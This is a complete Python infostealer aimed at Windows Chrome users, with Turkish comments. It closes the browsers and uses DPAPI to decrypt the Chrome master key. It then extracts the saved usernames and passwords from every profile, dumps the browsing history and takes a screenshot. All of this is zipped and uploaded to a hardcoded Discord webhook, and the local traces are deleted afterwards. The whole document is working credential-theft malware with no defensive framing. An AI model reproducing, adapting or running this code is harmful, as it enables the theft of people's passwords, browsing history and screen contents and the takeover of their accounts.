import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests
import zipfile
import psutil
import pyautogui

def close_all_browsers():
    for proc in psutil.process_iter():
        try:
            if "chrome" in proc.name().lower() or "firefox" in proc.name().lower():
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
WEBHOOK_URL = "https://discord.com/api/webhooks/1239029385378529360/lE5vlG62aj1mCuFy4mZJdLbelZ_CfKHZXTk0NBqQoe-qmRYrELaGPYee0ehvtTFOG66o"

def get_secret_key():
    try:
        # (1) Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def decrypt_login_data(chrome_path_login_db, secret_key):
    try:
        conn = get_db_connection(chrome_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            decrypted_logins = []
            for login in cursor.fetchall():
                origin_url = login[0]
                username = login[1]
                encrypted_password = login[2]
                if origin_url and username and encrypted_password:
                    decrypted_password = decrypt_password(encrypted_password, secret_key)
                    decrypted_logins.append((origin_url, username, decrypted_password))
            cursor.close()
            conn.close()
            return decrypted_logins
    except Exception as e:
        print("[ERR] %s" % str(e))
        return []

def decrypt_history(chrome_path_history_db):
    try:
        conn = sqlite3.connect(chrome_path_history_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            history = cursor.fetchall()
            cursor.close()
            conn.close()
            return history
    except Exception as e:
        print("[ERR] %s" % str(e))
        return []

def take_screenshot(filename):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)


if __name__ == '__main__':
    try:
        close_all_browsers()

        decrypted_password_content = "index, url, username, password\n"
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url != "" and username != "" and ciphertext != "":
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        decrypted_password_content += f"{index}, {url}, {username}, {decrypted_password}\n"
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

        # Decrypted history verilerini tutacak bir liste oluştur
        decrypted_history = []
        # Tüm klasörler için geçmişi çöz
        for folder in folders:
            # (3) Geçmişi çöz
            chrome_path_history_db = os.path.normpath(r"%s\%s\History" % (CHROME_PATH, folder))
            history = decrypt_history(chrome_path_history_db)
            decrypted_history.extend(history)

        # Decrypted history verilerini txt dosyasına yaz
        with open('decrypted_history.txt', mode='w', encoding='utf-8') as decrypt_history_file:
            for url, title, last_visit_time in decrypted_history:
                decrypt_history_file.write(f"URL: {url}\nTitle: {title}\nLast Visit Time: {last_visit_time}\n\n")

        # Zip dosyası oluştur ve içine txt dosyasını ekle
        with zipfile.ZipFile('decrypted_files.zip', 'w') as zipf:
            zipf.write('decrypted_history.txt')
            zipf.writestr('decrypted_password.txt', decrypted_password_content)

        # Ekran görüntüsü al ve zip dosyasına ekle
        screenshot_filename = "screenshot.png"
        take_screenshot(screenshot_filename)
        with zipfile.ZipFile('decrypted_files.zip', 'a') as zipf:
            zipf.write(screenshot_filename)

        # Send the zip file to the Discord webhook
        with open('decrypted_files.zip', 'rb') as f:
            response = requests.post(WEBHOOK_URL, files={'file': f})
            if response.status_code == 200:
                print("Zip dosyası başarıyla gönderildi!")
            else:
                print(f"Hata kodu: {response.status_code}, Hata mesajı: {response.text}")

    except Exception as e:
        print(f"Hata: {e}")

    try:
    # Dosyaları sil
        os.remove('screenshot.png')
        os.remove('decrypted_files.zip')
        os.remove('decrypted_history.txt')
        print("Dosyalar başarıyla silindi!")
    except Exception as e:
        print(f"Dosya silme hatası: {e}")   